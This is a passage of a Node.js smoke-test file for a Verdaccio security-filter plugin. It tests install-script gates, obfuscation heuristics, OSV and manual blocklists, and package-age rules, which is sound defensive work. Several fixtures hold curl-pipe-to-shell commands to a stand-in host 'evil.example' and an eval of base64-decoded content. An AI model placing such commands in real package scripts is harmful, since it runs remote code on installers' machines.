'use strict';

// Manual smoke test -- this repo has no test framework/build step for its
// plugins, but the publish-time gate parses the request body itself ahead
// of Verdaccio's own body-parser (see index.js's register_middlewares() for
// why that's safe), which has no other safety net. Run with:
//   node verdaccio-security-filter/test/smoke.js
// Spins up a real local HTTP server so the gate reads an actual request
// stream, exactly like it would in Verdaccio, rather than a hand-faked req.

const http = require('node:http');
const assert = require('node:assert/strict');
const {SecurityFilter} = require('../index.js');

const NOOP_LOGGER = {warn() {}, error() {}, info() {}, fatal() {}};

// Records every warn()/error() call's arguments so a test can assert on the
// exact fields logged, not just on the resulting block/reject decision --
// needed to confirm the CVE-vs-MAL log branch actually carries the right
// distinct fields (cveId/severity/cweIds vs malIds), not just "something".
function makeCapturingLogger() {
  const calls = {warn: [], error: [], fatal: []};
  return {
    warn: (...args) => calls.warn.push(args),
    error: (...args) => calls.error.push(args),
    fatal: (...args) => calls.fatal.push(args),
    info() {},
    calls,
  };
}

// A minimal stand-in for Verdaccio's Storage -- only the parts the plugin
// reads. The publish gate reads raw local metadata through
// localStorage.getPackageMetadata(); getPackage() is Verdaccio's filtered
// read, and `filteredView` lets a test give it a different (filtered)
// answer to prove the gate never uses it.
function makeFakeStorage() {
  const existingByName = new Map();
  const filteredByName = new Map();
  return {
    setExisting(name, versions, distTags = {}) {
      existingByName.set(name, {versions, 'dist-tags': distTags});
    },
    filteredView(name, versions, distTags = {}) {
      filteredByName.set(name, {versions, 'dist-tags': distTags});
    },
    getPackage({name, callback}) {
      const existing = filteredByName.get(name) ?? existingByName.get(name);
      if (!existing) return callback({status: 404}, null);
      callback(null, existing);
    },
    localStorage: {
      getPackageMetadata(name, callback) {
        const existing = existingByName.get(name);
        if (!existing) return callback({status: 404, code: 404}, null);
        callback(null, existing);
      },
    },
  };
}

// Stands in for Verdaccio's Auth#allow_publish: named users may publish,
// the anonymous user (no name) may not. `calls` records every check.
function makeFakeAuth({allow = user => user.name !== undefined} = {}) {
  const calls = [];
  return {
    calls,
    allow_publish({packageName}, user, callback) {
      calls.push({packageName, user: user.name});
      if (allow(user, packageName)) return callback(null, true);
      return callback(Object.assign(new Error('forbidden'), {status: 403}));
    },
  };
}

const PUBLISHER = {name: 'tester', groups: ['$all', '$authenticated']};

// Registers the plugin's middleware against a real http server so
// body-parser reads a genuine request stream, and shims just the
// Express-specific bits (req.path, res.status/json) the plugin relies on.
// register_middlewares() registers several app.use() handlers -- dispatch
// through all of them, in order, like a real Express app would, after any
// `before` handlers (stand-ins for Verdaccio's own earlier middleware).
// Every request carries `remoteUser`, as Verdaccio's apiJWTmiddleware
// would have set it before any plugin runs.
async function startServer(
  instance,
  storage,
  {
    auth = makeFakeAuth(),
    remoteUser = PUBLISHER,
    before = [],
    final = (req, res) =>
      // Reaching here means every gate let the request through --
      // simulate Verdaccio's own downstream publish handler succeeding.
      res.status(201).json({ok: true, versions: !!req.body?.versions}),
  } = {},
) {
  const handlers = [];
  instance.register_middlewares({use: fn => handlers.push(fn)}, auth, storage);
  const chain = [...before, ...handlers];

  const server = http.createServer((req, res) => {
    req.path = new URL(req.url, 'http://localhost').pathname;
    req.remote_user = remoteUser;
    res.status = function (code) {
      this.statusCode = code;
      return this;
    };
    res.json = function (body) {
      this.setHeader('content-type', 'application/json');
      this.end(JSON.stringify(body));
    };
    let index = 0;
    const next = err => {
      if (res.headersSent) return;
      if (err) {
        res.status(err.status || 500).json({error: err.message});
        return;
      }
      const handler = chain[index++];
      if (!handler) return final(req, res);
      handler(req, res, next);
    };
    next();
  });

  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  return server;
}

// Every request gets 10s, so a gate that never answers fails the check
// instead of hanging the run.
function put(server, path, body) {
  const {port} = server.address();
  return fetch(`http://127.0.0.1:${port}${path}`, {
    method: 'PUT',
    headers: body === undefined ? {} : {'content-type': 'application/json'},
    body: body === undefined ? undefined : JSON.stringify(body),
    signal: AbortSignal.timeout(10000),
  }).then(async res => ({
    status: res.status,
    body: await res.json().catch(() => null),
  }));
}

function withScripts(scripts) {
  return {scripts};
}

function daysAgo(n) {
  return new Date(Date.now() - n * 24 * 60 * 60 * 1000).toISOString();
}

// Builds a packument for direct filter_metadata() checks -- no HTTP server
// needed, unlike the publish-gate checks above, since filter_metadata is a
// plain async function. `entries` is `{ [version]: { publishedAt, ...meta } }`.
function makePackageInfo(name, entries, distTags = {}) {
  const versions = {};
  const time = {};
  for (const [ver, {publishedAt, ...meta}] of Object.entries(entries)) {
    versions[ver] = {
      version: ver,
      dist: {tarball: `https://example/${name}/-/${name}-${ver}.tgz`},
      ...meta,
    };
    time[ver] = publishedAt;
  }
  return {name, versions, time, 'dist-tags': {...distTags}};
}

function makeFakeBlocklist(matcher) {
  return {check: matcher};
}

async function main() {
  let passed = 0;

  async function check(name, fn) {
    try {
      await fn();
      passed++;
      console.log(`PASS: ${name}`);
    } catch (err) {
      console.error(`FAIL: ${name}`);
      console.error(err);
      process.exitCode = 1;
    }
  }

  function makeInstance(overrides = {}, optionsOverrides = {}) {
    return new SecurityFilter(
      {blockPublishWithNewScripts: true, ...overrides},
      {logger: NOOP_LOGGER, config: {}, ...optionsOverrides},
    );
  }

  await check(
    'brand-new package with an install script is allowed (no baseline to violate)',
    async () => {
      const storage = makeFakeStorage();
      const server = await startServer(makeInstance(), storage);
      try {
        const {status} = await put(server, '/new-pkg', {
          versions: {
            '1.0.0': withScripts({postinstall: 'curl evil.example | sh'}),
          },
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'a package that has always shipped install scripts is never blocked',
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting('native-addon', {
        '1.0.0': withScripts({install: 'node-gyp rebuild'}),
      });
      const server = await startServer(makeInstance(), storage);
      try {
        const {status} = await put(server, '/native-addon', {
          versions: {
            '1.0.0': withScripts({install: 'node-gyp rebuild'}),
            '1.1.0': withScripts({install: 'node-gyp rebuild'}),
          },
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'a new version introducing a script against a clean history is rejected',
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting('fortmesa-fmweb-fe', {
        '1.0.0': withScripts({}),
        '1.1.0': withScripts({}),
      });
      const server = await startServer(makeInstance(), storage);
      try {
        const {status, body} = await put(server, '/fortmesa-fmweb-fe', {
          versions: {
            '1.0.0': withScripts({}),
            '1.1.0': withScripts({}),
            '1.2.0': withScripts({postinstall: 'curl evil.example | sh'}),
          },
        });
        assert.equal(status, 403);
        assert.match(body.reason, /SECURITY BLOCK/);
        assert.match(body.reason, /1\.2\.0/);
        assert.match(body.reason, /postinstall/);
      } finally {
        server.close();
      }
    },
  );

  await check(
    "content-diff: a publish that changes an existing install script's content (never introducing a new key) is rejected, even for a package that always shipped one",
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting(
        'native-addon',
        {'1.0.0': withScripts({install: 'node-gyp rebuild'})},
        {latest: '1.0.0'},
      );
      const server = await startServer(makeInstance(), storage);
      try {
        const {status, body} = await put(server, '/native-addon', {
          versions: {
            '1.0.0': withScripts({install: 'node-gyp rebuild'}),
            '1.1.0': withScripts({
              install: 'node-gyp rebuild && curl evil.example | sh',
            }),
          },
        });
        assert.equal(status, 403);
        assert.match(body.reason, /SECURITY BLOCK/);
        assert.match(body.reason, /1\.1\.0/);
        assert.match(body.reason, /install/);
        assert.match(body.reason, /1\.0\.0/); // names the version it changed from
      } finally {
        server.close();
      }
    },
  );

  await check(
    "content-diff: a publish that keeps an existing install script's content byte-for-byte identical is allowed",
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting(
        'native-addon',
        {'1.0.0': withScripts({install: 'node-gyp rebuild'})},
        {latest: '1.0.0'},
      );
      const server = await startServer(makeInstance(), storage);
      try {
        const {status} = await put(server, '/native-addon', {
          versions: {
            '1.0.0': withScripts({install: 'node-gyp rebuild'}),
            '1.1.0': withScripts({install: 'node-gyp rebuild'}),
          },
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'content-diff: allow-list still overrides a changed-script rejection',
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting(
        'native-addon',
        {'1.0.0': withScripts({install: 'node-gyp rebuild'})},
        {latest: '1.0.0'},
      );
      const server = await startServer(
        makeInstance({allow: ['native-addon']}),
        storage,
      );
      try {
        const {status} = await put(server, '/native-addon', {
          versions: {
            '1.0.0': withScripts({install: 'node-gyp rebuild'}),
            '1.1.0': withScripts({install: 'curl evil.example | sh'}),
          },
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  // --- Structural obfuscation heuristics (scriptHeuristics) ---

  await check(
    'obfuscation heuristics: disabled by default -- an obvious curl-pipe-to-shell payload is neither blocked nor logged',
    async () => {
      const storage = makeFakeStorage();
      const logger = makeCapturingLogger();
      const server = await startServer(makeInstance({}, {logger}), storage);
      try {
        const {status} = await put(server, '/new-pkg', {
          versions: {
            '1.0.0': withScripts({
              postinstall: 'curl https://evil.example/x | sh',
            }),
          },
        });
        assert.equal(status, 201);
        assert.equal(logger.calls.warn.length, 0);
        assert.equal(logger.calls.fatal.length, 0);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'obfuscation heuristics: enabled, blockShellPipe off -- curl-pipe-to-shell alerts (logs) but does not block the publish',
    async () => {
      const storage = makeFakeStorage();
      const logger = makeCapturingLogger();
      const server = await startServer(
        makeInstance({scriptHeuristics: {enabled: true}}, {logger}),
        storage,
      );
      try {
        const {status} = await put(server, '/new-pkg', {
          versions: {
            '1.0.0': withScripts({
              postinstall: 'curl https://evil.example/x | sh',
            }),
          },
        });
        assert.equal(status, 201);
        assert.equal(logger.calls.warn.length, 1);
        const [fields] = logger.calls.warn[0];
        assert.deepEqual(fields.hits, ['shell-pipe', 'network-call']);
        assert.equal(logger.calls.fatal.length, 0);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'obfuscation heuristics: enabled with blockShellPipe -- curl-pipe-to-shell is rejected outright',
    async () => {
      const storage = makeFakeStorage();
      const logger = makeCapturingLogger();
      const server = await startServer(
        makeInstance(
          {scriptHeuristics: {enabled: true, blockShellPipe: true}},
          {logger},
        ),
        storage,
      );
      try {
        const {status, body} = await put(server, '/new-pkg', {
          versions: {
            '1.0.0': withScripts({
              postinstall: 'curl https://evil.example/x | sh',
            }),
          },
        });
        assert.equal(status, 403);
        assert.match(body.reason, /SECURITY BLOCK/);
        assert.match(body.reason, /shell-pipe/);
        assert.equal(logger.calls.fatal.length, 1);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'obfuscation heuristics: eval() in a script alerts, but is never block-capable even with blockShellPipe on',
    async () => {
      const storage = makeFakeStorage();
      const logger = makeCapturingLogger();
      const server = await startServer(
        makeInstance(
          {scriptHeuristics: {enabled: true, blockShellPipe: true}},
          {logger},
        ),
        storage,
      );
      try {
        const {status} = await put(server, '/new-pkg', {
          versions: {
            '1.0.0': withScripts({
              postinstall: "eval(Buffer.from('bad', 'base64').toString())",
            }),
          },
        });
        assert.equal(status, 201);
        assert.equal(logger.calls.warn.length, 1);
        const [fields] = logger.calls.warn[0];
        assert.deepEqual(fields.hits, ['eval']);
        assert.equal(logger.calls.fatal.length, 0);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'obfuscation heuristics: a bare network call alone (no other signal) is never flagged -- legitimate native-build scripts are unaffected',
    async () => {
      const storage = makeFakeStorage();
      const logger = makeCapturingLogger();
      const server = await startServer(
        makeInstance(
          {scriptHeuristics: {enabled: true, blockShellPipe: true}},
          {logger},
        ),
        storage,
      );
      try {
        const {status} = await put(server, '/new-pkg', {
          versions: {
            '1.0.0': withScripts({
              install:
                'curl -O https://github.com/foo/bar/releases/download/v1/prebuilt.tar.gz',
            }),
          },
        });
        assert.equal(status, 201);
        assert.equal(logger.calls.warn.length, 0);
        assert.equal(logger.calls.fatal.length, 0);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'obfuscation heuristics: allow-list overrides even the block-capable shell-pipe pattern',
    async () => {
      const storage = makeFakeStorage();
      const server = await startServer(
        makeInstance({
          allow: ['new-pkg'],
          scriptHeuristics: {enabled: true, blockShellPipe: true},
        }),
        storage,
      );
      try {
        const {status} = await put(server, '/new-pkg', {
          versions: {
            '1.0.0': withScripts({
              postinstall: 'curl https://evil.example/x | sh',
            }),
          },
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'a new version with no script against a clean history is allowed',
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting('fortmesa-fmweb-fe', {'1.0.0': withScripts({})});
      const server = await startServer(makeInstance(), storage);
      try {
        const {status} = await put(server, '/fortmesa-fmweb-fe', {
          versions: {'1.0.0': withScripts({}), '1.1.0': withScripts({})},
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'resending only already-known versions (deprecate/star-shaped) is allowed',
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting('fortmesa-fmweb-fe', {'1.0.0': withScripts({})});
      const server = await startServer(makeInstance(), storage);
      try {
        const {status} = await put(server, '/fortmesa-fmweb-fe', {
          versions: {'1.0.0': {...withScripts({}), deprecated: 'use 2.x'}},
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  await check('the tarball-only upload route is never inspected', async () => {
    const storage = makeFakeStorage();
    storage.setExisting('fortmesa-fmweb-fe', {'1.0.0': withScripts({})});
    const server = await startServer(makeInstance(), storage);
    try {
      const {status} = await put(
        server,
        '/fortmesa-fmweb-fe/-/fortmesa-fmweb-fe-1.2.0.tgz',
        undefined,
      );
      assert.equal(status, 201);
    } finally {
      server.close();
    }
  });

  await check('GET requests are never intercepted', async () => {
    const storage = makeFakeStorage();
    const server = await startServer(makeInstance(), storage);
    try {
      const {port} = server.address();
      const res = await fetch(`http://127.0.0.1:${port}/fortmesa-fmweb-fe`, {
        signal: AbortSignal.timeout(10000),
        method: 'GET',
      });
      assert.equal(res.status, 201); // reached the fake "downstream" handler untouched
    } finally {
      server.close();
    }
  });

  await check(
    'disabled by config, the gate never blocks even an obvious violation',
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting('fortmesa-fmweb-fe', {'1.0.0': withScripts({})});
      const server = await startServer(
        makeInstance({blockPublishWithNewScripts: false}),
        storage,
      );
      try {
        const {status} = await put(server, '/fortmesa-fmweb-fe', {
          versions: {
            '1.0.0': withScripts({}),
            '1.1.0': withScripts({postinstall: 'curl evil.example | sh'}),
          },
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'malformed JSON is propagated as an error, not a hang or a false allow',
    async () => {
      const storage = makeFakeStorage();
      const server = await startServer(makeInstance(), storage);
      try {
        const {port} = server.address();
        const res = await fetch(`http://127.0.0.1:${port}/fortmesa-fmweb-fe`, {
          signal: AbortSignal.timeout(10000),
          method: 'PUT',
          headers: {'content-type': 'application/json'},
          body: '{not valid json',
        });
        assert.equal(res.status, 400);
      } finally {
        server.close();
      }
    },
  );

  // --- filter_metadata() direct checks: allow/block/OSV/date/replace ---

  await check('allow-list overrides an OSV blocklist hit', async () => {
    const fakeStore = makeFakeBlocklist(name =>
      name === '@evil/pkg' ? {malIds: ['MAL-1']} : null,
    );
    const instance = new SecurityFilter(
      {allow: ['@evil/*']},
      {logger: NOOP_LOGGER, config: {}, maliciousPackageStore: fakeStore},
    );
    const pkg = makePackageInfo('@evil/pkg', {
      '1.0.0': {publishedAt: daysAgo(10)},
    });
    const result = await instance.filter_metadata(pkg);
    assert.ok('1.0.0' in result.versions);
  });

  await check('allow-list overrides a manual block: rule', async () => {
    const instance = new SecurityFilter(
      {block: ['foo'], allow: [{foo: {versions: '1.0.0'}}]},
      {logger: NOOP_LOGGER, config: {}},
    );
    const pkg = makePackageInfo('foo', {
      '1.0.0': {publishedAt: daysAgo(10)},
      '2.0.0': {publishedAt: daysAgo(10)},
    });
    const result = await instance.filter_metadata(pkg);
    assert.ok('1.0.0' in result.versions);
    assert.ok(!('2.0.0' in result.versions));
  });

  await check(
    'manual block by scope removes every version under that scope',
    async () => {
      const instance = new SecurityFilter(
        {block: ['@bad/*']},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo('@bad/thing', {
        '1.0.0': {publishedAt: daysAgo(10)},
        '2.0.0': {publishedAt: daysAgo(10)},
      });
      const result = await instance.filter_metadata(pkg);
      assert.equal(Object.keys(result.versions).length, 0);
    },
  );

  await check(
    'manual block by version range blocks only matching versions and redirects the dist-tag',
    async () => {
      const instance = new SecurityFilter(
        {block: [{foo: {versions: '>=2.0.0'}}]},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo(
        'foo',
        {
          '1.0.0': {publishedAt: daysAgo(10)},
          '2.0.0': {publishedAt: daysAgo(9)},
          '3.0.0': {publishedAt: daysAgo(8)},
        },
        {latest: '3.0.0'},
      );
      const result = await instance.filter_metadata(pkg);
      assert.ok('1.0.0' in result.versions);
      assert.ok(!('2.0.0' in result.versions));
      assert.ok(!('3.0.0' in result.versions));
      assert.equal(result['dist-tags'].latest, '1.0.0');
    },
  );

  await check(
    'thresholdDate can be the more restrictive side of the combined cutoff',
    async () => {
      const instance = new SecurityFilter(
        {packageAge: {minDays: 0, thresholdDate: daysAgo(5)}},
        {logger: NOOP_LOGGER, config: {}},
      );
      // Passes minDays: 0 trivially, but falls inside the thresholdDate window.
      const pkg = makePackageInfo('foo', {'1.0.0': {publishedAt: daysAgo(2)}});
      const result = await instance.filter_metadata(pkg);
      assert.ok(!('1.0.0' in result.versions));
    },
  );

  await check(
    'minDays can be the more restrictive side of the combined cutoff',
    async () => {
      const instance = new SecurityFilter(
        {packageAge: {minDays: 30, thresholdDate: daysAgo(1)}},
        {logger: NOOP_LOGGER, config: {}},
      );
      // Passes thresholdDate (published before yesterday), but falls inside the minDays(30) window.
      const pkg = makePackageInfo('foo', {'1.0.0': {publishedAt: daysAgo(2)}});
      const result = await instance.filter_metadata(pkg);
      assert.ok(!('1.0.0' in result.versions));
    },
  );

  await check(
    'thresholdDate accepts a bare date (no time component)',
    async () => {
      const instance = new SecurityFilter(
        {packageAge: {minDays: 0, thresholdDate: '2026-01-01'}},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo('foo', {
        '1.0.0': {publishedAt: '2025-12-31T00:00:00Z'},
        '2.0.0': {publishedAt: '2026-06-01T00:00:00Z'},
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok(
        '1.0.0' in result.versions,
        'published before the bare thresholdDate should be served',
      );
      assert.ok(
        !('2.0.0' in result.versions),
        'published after the bare thresholdDate should be blocked',
      );
    },
  );

  await check(
    'manual block: strategy replace substitutes the nearest older version',
    async () => {
      const instance = new SecurityFilter(
        {block: [{foo: {versions: '2.0.0', strategy: 'replace'}}]},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo('foo', {
        '1.0.0': {publishedAt: daysAgo(10)},
        '2.0.0': {publishedAt: daysAgo(9)},
      });
      const originalTime = {...pkg.time};
      const result = await instance.filter_metadata(pkg);
      assert.ok('2.0.0' in result.versions); // key kept, not removed
      assert.equal(result.versions['2.0.0'].version, '2.0.0'); // packument still claims to be 2.0.0
      assert.equal(
        result.versions['2.0.0'].dist.tarball,
        result.versions['1.0.0'].dist.tarball,
      ); // serves 1.0.0's real content
      assert.deepEqual(result.time, originalTime); // time/original entries untouched
    },
  );

  await check(
    'manual block: strategy replace falls back to remove when no substitute is available',
    async () => {
      const instance = new SecurityFilter(
        {block: [{foo: {versions: '1.0.0', strategy: 'replace'}}]},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo('foo', {'1.0.0': {publishedAt: daysAgo(10)}}); // only version -- nothing to substitute with
      const result = await instance.filter_metadata(pkg);
      assert.ok(!('1.0.0' in result.versions));
    },
  );

  await check(
    'OSV blocklist hit blocks a version that passes every other check',
    async () => {
      const fakeStore = makeFakeBlocklist(name =>
        name === 'evil-pkg' ? {type: 'mal', malIds: ['MAL-123']} : null,
      );
      const instance = new SecurityFilter(
        {},
        {logger: NOOP_LOGGER, config: {}, maliciousPackageStore: fakeStore},
      );
      const pkg = makePackageInfo('evil-pkg', {
        '1.0.0': {publishedAt: daysAgo(30)},
      }); // old enough, no scripts
      const result = await instance.filter_metadata(pkg);
      assert.ok(!('1.0.0' in result.versions));
    },
  );

  await check(
    'a CVE-shaped OSV hit logs cveId/severity/cweIds, distinctly from a MAL-shaped hit',
    async () => {
      const logger = makeCapturingLogger();
      const fakeStore = makeFakeBlocklist(name =>
        name === 'vuln-pkg'
          ? {
              type: 'cve',
              ids: ['GHSA-1'],
              cveId: 'CVE-2025-1',
              severity: 'HIGH',
              cweIds: ['CWE-79'],
            }
          : null,
      );
      const instance = new SecurityFilter(
        {},
        {logger, config: {}, maliciousPackageStore: fakeStore},
      );
      const pkg = makePackageInfo('vuln-pkg', {
        '1.0.0': {publishedAt: daysAgo(30)},
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok(!('1.0.0' in result.versions));
      assert.equal(logger.calls.warn.length, 1);
      const [fields, message] = logger.calls.warn[0];
      assert.equal(fields.cveId, 'CVE-2025-1');
      assert.equal(fields.severity, 'HIGH');
      assert.deepEqual(fields.cweIds, ['CWE-79']);
      assert.equal(
        fields.malIds,
        undefined,
        'a CVE hit must not carry a malIds field',
      );
      assert.match(message, /known vulnerability/);
    },
  );

  await check(
    "osv.blockStrategy: 'replace' substitutes an OSV-flagged version like a manual replace rule would",
    async () => {
      const fakeStore = makeFakeBlocklist((name, ver) =>
        ver === '2.0.0' ? {malIds: ['MAL-1']} : null,
      );
      const instance = new SecurityFilter(
        {osv: {blockStrategy: 'replace'}},
        {logger: NOOP_LOGGER, config: {}, maliciousPackageStore: fakeStore},
      );
      const pkg = makePackageInfo('foo', {
        '1.0.0': {publishedAt: daysAgo(10)},
        '2.0.0': {publishedAt: daysAgo(9)},
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok('2.0.0' in result.versions);
      assert.equal(
        result.versions['2.0.0'].dist.tarball,
        result.versions['1.0.0'].dist.tarball,
      );
    },
  );

  await check(
    "osv.blockStrategy: 'remove' (the default) hard-removes an OSV-flagged version",
    async () => {
      const fakeStore = makeFakeBlocklist((name, ver) =>
        ver === '2.0.0' ? {malIds: ['MAL-1']} : null,
      );
      const instance = new SecurityFilter(
        {},
        {logger: NOOP_LOGGER, config: {}, maliciousPackageStore: fakeStore},
      );
      const pkg = makePackageInfo('foo', {
        '1.0.0': {publishedAt: daysAgo(10)},
        '2.0.0': {publishedAt: daysAgo(9)},
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok(!('2.0.0' in result.versions));
    },
  );

  await check(
    'filter_metadata leaves an unremarkable package untouched',
    async () => {
      const instance = new SecurityFilter(
        {},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo('boring-pkg', {
        '1.0.0': {publishedAt: daysAgo(30)},
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok('1.0.0' in result.versions);
    },
  );

  await check(
    'content-diff (read-time): a version whose install script content changed from the immediately preceding version is blocked, even for a package that always shipped one',
    async () => {
      const instance = new SecurityFilter(
        {},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo('native-addon', {
        '1.0.0': {
          publishedAt: daysAgo(400),
          scripts: {install: 'node-gyp rebuild'},
        },
        '1.1.0': {
          publishedAt: daysAgo(10),
          scripts: {install: 'node-gyp rebuild && curl evil.example | sh'},
        },
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok(!('1.1.0' in result.versions));
      assert.ok('1.0.0' in result.versions);
    },
  );

  await check(
    'content-diff (read-time): identical script content across versions is never blocked',
    async () => {
      const instance = new SecurityFilter(
        {},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo('native-addon', {
        '1.0.0': {
          publishedAt: daysAgo(400),
          scripts: {install: 'node-gyp rebuild'},
        },
        '1.1.0': {
          publishedAt: daysAgo(10),
          scripts: {install: 'node-gyp rebuild'},
        },
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok('1.0.0' in result.versions);
      assert.ok('1.1.0' in result.versions);
    },
  );

  await check(
    'obfuscation heuristics (read-time): disabled by default -- an obvious curl-pipe-to-shell payload is left alone',
    async () => {
      const instance = new SecurityFilter(
        {},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo('evil-pkg', {
        '1.0.0': {
          publishedAt: daysAgo(30),
          scripts: {postinstall: 'curl https://evil.example/x | sh'},
        },
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok('1.0.0' in result.versions);
    },
  );

  await check(
    'obfuscation heuristics (read-time): enabled with blockShellPipe -- curl-pipe-to-shell is removed',
    async () => {
      const instance = new SecurityFilter(
        {scriptHeuristics: {enabled: true, blockShellPipe: true}},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo('evil-pkg', {
        '1.0.0': {
          publishedAt: daysAgo(30),
          scripts: {postinstall: 'curl https://evil.example/x | sh'},
        },
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok(!('1.0.0' in result.versions));
    },
  );

  await check(
    'obfuscation heuristics (read-time): enabled without blockShellPipe -- alerts (logs) but leaves the version installable',
    async () => {
      const logger = makeCapturingLogger();
      const instance = new SecurityFilter(
        {scriptHeuristics: {enabled: true}},
        {logger, config: {}},
      );
      const pkg = makePackageInfo('evil-pkg', {
        '1.0.0': {
          publishedAt: daysAgo(30),
          scripts: {postinstall: 'curl https://evil.example/x | sh'},
        },
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok('1.0.0' in result.versions);
      assert.equal(logger.calls.warn.length, 1);
    },
  );

  await check(
    'obfuscation heuristics (read-time): a bare network call alone is never flagged',
    async () => {
      const logger = makeCapturingLogger();
      const instance = new SecurityFilter(
        {scriptHeuristics: {enabled: true, blockShellPipe: true}},
        {logger, config: {}},
      );
      const pkg = makePackageInfo('native-addon', {
        '1.0.0': {
          publishedAt: daysAgo(30),
          scripts: {
            install:
              'curl -O https://github.com/foo/bar/releases/download/v1/prebuilt.tar.gz',
          },
        },
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok('1.0.0' in result.versions);
      assert.equal(logger.calls.warn.length, 0);
    },
  );

  // --- Publish-gate checks: OSV/manual-block matches (blockPublishMatches) ---

  await check(
    'publish rejected on OSV blocklist match, even for a brand-new package',
    async () => {
      const storage = makeFakeStorage();
      const fakeStore = makeFakeBlocklist(name =>
        name === 'evil-pkg' ? {type: 'mal', malIds: ['MAL-1']} : null,
      );
      const server = await startServer(
        makeInstance(
          {blockPublishMatches: true},
          {maliciousPackageStore: fakeStore},
        ),
        storage,
      );
      try {
        const {status, body} = await put(server, '/evil-pkg', {
          versions: {'1.0.0': withScripts({})},
        });
        assert.equal(status, 403);
        assert.match(body.reason, /SECURITY BLOCK/);
        assert.match(body.reason, /MAL-1/);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'publish rejected on a CVE-shaped OSV hit reports vulnerability detail, not malIds',
    async () => {
      const storage = makeFakeStorage();
      const logger = makeCapturingLogger();
      const fakeStore = makeFakeBlocklist(name =>
        name === 'vuln-pkg'
          ? {
              type: 'cve',
              ids: ['GHSA-1'],
              cveId: 'CVE-2025-1',
              severity: 'CRITICAL',
              cweIds: ['CWE-79'],
            }
          : null,
      );
      const server = await startServer(
        makeInstance(
          {blockPublishMatches: true},
          {logger, maliciousPackageStore: fakeStore},
        ),
        storage,
      );
      try {
        const {status, body} = await put(server, '/vuln-pkg', {
          versions: {'1.0.0': withScripts({})},
        });
        assert.equal(status, 403);
        assert.match(body.reason, /CVE-2025-1/);
        assert.match(body.reason, /CRITICAL/);
        assert.equal(logger.calls.fatal.length, 1);
        const [fields] = logger.calls.fatal[0];
        assert.equal(fields.cveId, 'CVE-2025-1');
        assert.equal(
          fields.malIds,
          undefined,
          'a CVE hit must not carry a malIds field',
        );
      } finally {
        server.close();
      }
    },
  );

  await check(
    'publish rejected on manual block: match, even for a brand-new package',
    async () => {
      const storage = makeFakeStorage();
      const server = await startServer(
        makeInstance({blockPublishMatches: true, block: ['bad-pkg']}),
        storage,
      );
      try {
        const {status, body} = await put(server, '/bad-pkg', {
          versions: {'1.0.0': withScripts({})},
        });
        assert.equal(status, 403);
        assert.match(body.reason, /SECURITY BLOCK/);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'allow-list bypasses a manual block: match at publish time',
    async () => {
      const storage = makeFakeStorage();
      const server = await startServer(
        makeInstance({
          blockPublishMatches: true,
          block: ['trusted-pkg'],
          allow: [{'trusted-pkg': {versions: '1.0.0'}}],
        }),
        storage,
      );
      try {
        const {status} = await put(server, '/trusted-pkg', {
          versions: {'1.0.0': withScripts({})},
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'blockPublishMatches and blockPublishWithNewScripts toggle independently',
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting('fortmesa-fmweb-fe', {'1.0.0': withScripts({})});
      const server = await startServer(
        makeInstance({
          blockPublishWithNewScripts: false,
          blockPublishMatches: true,
          block: ['bad-pkg'],
        }),
        storage,
      );
      try {
        const scriptResult = await put(server, '/fortmesa-fmweb-fe', {
          versions: {
            '1.0.0': withScripts({}),
            '1.1.0': withScripts({postinstall: 'curl evil.example | sh'}),
          },
        });
        assert.equal(scriptResult.status, 201); // script check is off, so this passes despite the new script

        const blockResult = await put(server, '/bad-pkg', {
          versions: {'1.0.0': withScripts({})},
        });
        assert.equal(blockResult.status, 403); // block-match check is still active
      } finally {
        server.close();
      }
    },
  );

  await check(
    'blockPublishMatches disabled by config never blocks even an obvious manual-block match',
    async () => {
      const storage = makeFakeStorage();
